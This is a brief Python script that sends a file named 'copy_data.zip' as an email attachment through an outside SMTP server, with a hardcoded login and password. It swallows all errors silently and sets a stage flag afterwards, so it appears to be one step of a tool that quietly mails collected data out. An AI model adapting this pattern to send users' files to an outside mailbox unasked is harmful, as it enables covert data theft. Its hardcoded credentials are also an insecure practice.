import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication 

"""Involking module: smtplib, MIMEText is the document"""
"""MIMEImage -- image, MIMEMultipart -- multitype file"""

fromaddr = 'felix_test_mail@yeah.net'

password = 'test223'

toaddrs = ['felix_test_mail@yeah.net']

content = '[SUCCESS] We already send you the file. Have a good day.'
content += '\n                              ---Greetings from T**3'

"""The body of this email"""
textApart = MIMEText(content)

"""Send the file with ZIP format"""         

zipFile = 'copy_data.zip'

zipApart = MIMEApplication(open(zipFile, 'rb').read())

zipApart.add_header('Content-Disposition', 'attachment', filename=zipFile)

"""SEND THE FILE!!!"""
m = MIMEMultipart()

m.attach(textApart)
m.attach(zipApart)

#邮件标题                
m['Subject'] = '[SUCCESS]'

try:
        server = smtplib.SMTP('smtp.yeah.net')

        server.login(fromaddr,password)

        server.sendmail(fromaddr, toaddrs, m.as_string())

        server.quit()

except smtplib.SMTPException as e:

        pass

sign_4 = True
